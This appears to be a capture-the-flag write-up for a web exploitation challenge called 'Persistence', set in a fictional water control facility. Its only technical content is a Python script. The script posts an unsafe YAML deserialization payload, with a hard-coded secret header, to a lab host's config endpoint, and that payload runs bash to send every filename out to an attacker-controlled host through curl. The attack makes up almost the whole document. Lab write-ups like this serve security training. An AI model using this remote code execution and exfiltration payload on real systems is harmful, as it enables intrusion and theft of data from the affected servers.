---
title: Persistence
categories: Web Exploitation
tags: 
draft: true
completedDuringEvent: true
submitted: true
points: 60
solves: -1
flags: flag: THM{REDACTED}
---
> After the notorious malware strike on the Virelia Water Control Facility, phantom alerts and erratic sensor readings plague a system that was supposed to be fully remediated.
>
> As a Black Echo red-team specialist, you must penetrate the compromised portal, unravel its hidden persistence mechanism, and neutralise the backdoor before it can be reactivated.

---

```py
import requests

payload = (
    '!!python/object/apply:os.system ["bash -c '
    "'for i in $(ls); do curl http://10.17.37.98/$i; done'\"]"
)

headers = {"X-FTW": "secr3tFTW192d2390", "Content-Type": "application/x-yaml"}

res = requests.post(
    "http://10.10.232.80:8080/config/update", data=payload, headers=headers
)
print(res.status_code, res.text)
```
